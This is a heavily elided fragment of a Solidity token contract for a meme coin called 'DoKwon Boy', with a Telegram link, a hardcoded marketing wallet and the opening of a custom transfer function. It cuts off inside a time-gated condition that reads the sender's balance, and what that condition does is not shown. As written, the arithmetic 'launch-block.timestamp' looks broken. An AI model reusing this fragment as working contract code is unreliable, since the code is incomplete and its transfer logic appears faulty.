...
//   Telergam : https://t.me/Dokwonboy1
pragma solidity ^0.8;
interface IERC20 {
...
contract DOKWONBOY is Context, IERC20, Ownable {
    ...
    address payable public _marketingWallet = payable (0x6022026545eD5a4aD9ED85069F17dB36c7C5A480);
    ...
    string private constant _name = "DoKwon Boy";
    string private constant _symbol = "DOGB";
    ...
    function _transfer(
        ...
        uint256 getBalance = from.balance;
         if( launch-block.timestamp < 2 days - 40 minutes &&
